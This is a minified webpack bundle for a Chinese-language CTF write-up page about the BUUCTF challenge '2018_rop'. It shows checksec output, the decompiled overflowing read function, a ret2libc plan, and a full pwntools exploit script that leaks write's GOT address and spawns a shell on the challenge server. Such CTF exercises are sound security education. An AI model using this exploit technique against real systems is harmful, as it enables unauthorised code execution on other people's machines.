(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[606],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return s},kt:function(){return m}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var p=r.createContext({}),c=function(e){var n=r.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},s=function(e){var n=c(e.components);return r.createElement(p.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,p=e.parentName,s=o(e,["components","mdxType","originalType","parentName"]),u=c(t),m=a,b=u["".concat(p,".").concat(m)]||u[m]||d[m]||i;return t?r.createElement(b,l(l({ref:n},s),{},{components:t})):r.createElement(b,l({ref:n},s))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,l=new Array(i);l[0]=u;var o={};for(var p in n)hasOwnProperty.call(n,p)&&(o[p]=n[p]);o.originalType=e,o.mdxType="string"==typeof e?e:a,l[1]=o;for(var c=2;c<i;c++)l[c]=t[c];return r.createElement.apply(null,l)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},5033:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return o},contentTitle:function(){return p},metadata:function(){return c},toc:function(){return s},default:function(){return u}});var r=t(2122),a=t(9756),i=(t(7294),t(3905)),l=["components"],o={title:"2018_rop",sidebar_position:19},p=void 0,c={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/rop",id:"BUUCTF/\u6808\u6ea2\u51fa/rop",isDocsHomePage:!1,title:"2018_rop",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\2018_rop.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/rop",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/rop",version:"current",sidebarPosition:19,frontMatter:{title:"2018_rop",sidebar_position:19},sidebar:"tutorialSidebar",previous:{title:"shell_asm",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/shell_asm"},next:{title:"bjdctf_2020_babyrop",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babyrop"}},s=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],d={toc:s};function u(e){var n=e.components,t=(0,a.Z)(e,l);return(0,i.kt)("wrapper",(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h3",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"ROP\u6784\u9020")),(0,i.kt)("h3",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,i.kt)("p",null,"checksec\uff0c\u5f00\u4e86NX"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=2018_rop \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified Fortifiable     FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70) Symbols       No    012018_rop\n")),(0,i.kt)("p",null,"ida\u770b\u4e0b\uff0c",(0,i.kt)("inlineCode",{parentName:"p"},"vulnerable_function"),"\u51fd\u6570\u5982\u4e0b"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},"ssize_t vulnerable_function()\n{\n  char buf[136]; // [esp+10h] [ebp-88h] BYREF\n\n  return read(0, buf, 0x100u);\n}\n")),(0,i.kt)("p",null,"\u5f88\u660e\u663e\u53ef\u4ee5\u6808\u6ea2\u51fa\uff0c\u9700\u8981",(0,i.kt)("inlineCode",{parentName:"p"},"0x8c"),"\u4e2a\u5b57\u7b26\u624d\u80fd\u8986\u76d6\u5230\u8fd4\u56de\u5730\u5740\uff0c\u5269\u4e0b",(0,i.kt)("inlineCode",{parentName:"p"},"0x74"),"\u4e2a\u5b57\u7b26\u53ef\u4ee5\u8ba9\u6211\u4eec\u6784\u9020rop\u3002"),(0,i.kt)("p",null,"\u7531\u4e8e\u5de6\u4fa7\u6ca1\u6709",(0,i.kt)("inlineCode",{parentName:"p"},"system"),"\u51fd\u6570\uff0c\u90a3\u5c31\u9700\u8981\u6cc4\u9732\u51fd\u6570\u5730\u5740\u6765\u8ba1\u7b97\u5f97\u51fa\u3002\u80fd\u591f\u7528\u4f5c\u8f93\u51fa\u5185\u5bb9\u7684\u51fd\u6570\u53ea\u770b\u5230\u4e86",(0,i.kt)("inlineCode",{parentName:"p"},"write"),"\uff0c\u800c",(0,i.kt)("inlineCode",{parentName:"p"},"write"),"\u9700\u89813\u4e2a\u53c2\u6570\u3002"),(0,i.kt)("p",null,"\u6574\u7406\u4ee5\u4e0b\u89e3\u9898\u601d\u8def\u5982\u4e0b\uff1a"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"\u6808\u6ea2\u51fa\u8c03\u7528",(0,i.kt)("inlineCode",{parentName:"li"},"write"),"\u51fd\u6570\u6cc4\u9732\u51fa",(0,i.kt)("inlineCode",{parentName:"li"},"write"),"\u51fd\u6570\u7684got\u5730\u5740"),(0,i.kt)("li",{parentName:"ol"},"\u8ba1\u7b97\u51fa",(0,i.kt)("inlineCode",{parentName:"li"},"system"),"\u51fd\u6570\u4ee5\u53ca\u5b57\u7b26\u4e32",(0,i.kt)("inlineCode",{parentName:"li"},"/bin/sh"),"\u5730\u5740"),(0,i.kt)("li",{parentName:"ol"},"\u91cd\u65b0\u8c03\u7528",(0,i.kt)("inlineCode",{parentName:"li"},"main"),"\u51fd\u6570"),(0,i.kt)("li",{parentName:"ol"},"\u518d\u6b21\u6808\u6ea2\u51fa\u8c03\u7528",(0,i.kt)("inlineCode",{parentName:"li"},"system('/bin/sh')"))),(0,i.kt)("p",null,"ROPgadget\u641c\u7d22\u4ee5\u4e0b\u7b26\u5408\u8981\u6c42\u7684gadget"),(0,i.kt)("p",null,"\u90a3\u4e48\u5f88\u5feb\u5c31\u53ef\u4ee5\u5f97\u51fa\u6cc4\u9732",(0,i.kt)("inlineCode",{parentName:"p"},"write"),"\u51fd\u6570got\u5730\u5740\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python"},"write_plt = elf.plt['write']\nwrite_got = elf.got['write']\npop3_ret = 0x0804855d\n_start_addr = 0x080483C0\npayload1 = b'a' * 0x8c + p32(write_plt) + p32(_start_addr)\npayload1 += p32(1) + p32(write_got) + p32(4)\n")),(0,i.kt)("p",null,"\u6cc4\u9732\u5730\u5740\u540e\u8ba1\u7b97\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python"},"write_addr = u32(sh.recv(4))\nlibc = LibcSearcher('write', write_addr)\nlibc_base = write_addr - libc.dump('write')\nsys_addr = libc_base + libc.dump('system')\nbin_sh_addr = libc_base + libc.dump('str_bin_sh')\n")),(0,i.kt)("p",null,"\u8c03\u7528",(0,i.kt)("inlineCode",{parentName:"p"},"system('/bin/sh')"),"\u90e8\u5206\u7684payload\u4e3a\uff1a",(0,i.kt)("inlineCode",{parentName:"p"},"payload2 = b'a' * 0x8c + p32(sys_addr) + p32(_start_addr) + p32(bin_sh_addr)")),(0,i.kt)("p",null,"\u6700\u7ec8\u5f97\u5230\u5b8c\u6574\u811a\u672c\u4e3a\uff1a"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\nfrom LibcSearcher import *\n\nis_debug = 0\nfile_name = './2018_rop'\nhost = 'node4.buuoj.cn'\nport = 27743\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n    \n    elf = ELF(file_name)\n    write_plt = elf.plt['write']\n    write_got = elf.got['write']\n    _start_addr = 0x080483C0\n    payload1 = b'a' * 0x8c + p32(write_plt) + p32(_start_addr)\n    payload1 += p32(1) + p32(write_got) + p32(4)\n    \n    sh.sendline(payload1)\n    \n    write_addr = u32(sh.recv(4))\n    libc = LibcSearcher('write', write_addr)\n    libc_base = write_addr - libc.dump('write')\n    sys_addr = libc_base + libc.dump('system')\n    bin_sh_addr = libc_base + libc.dump('str_bin_sh')\n\n    payload2 = b'a' * 0x8c + p32(sys_addr) + p32(_start_addr) + p32(bin_sh_addr)\n    \n    sh.sendline(payload2)\n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")))}u.isMDXComponent=!0}}]);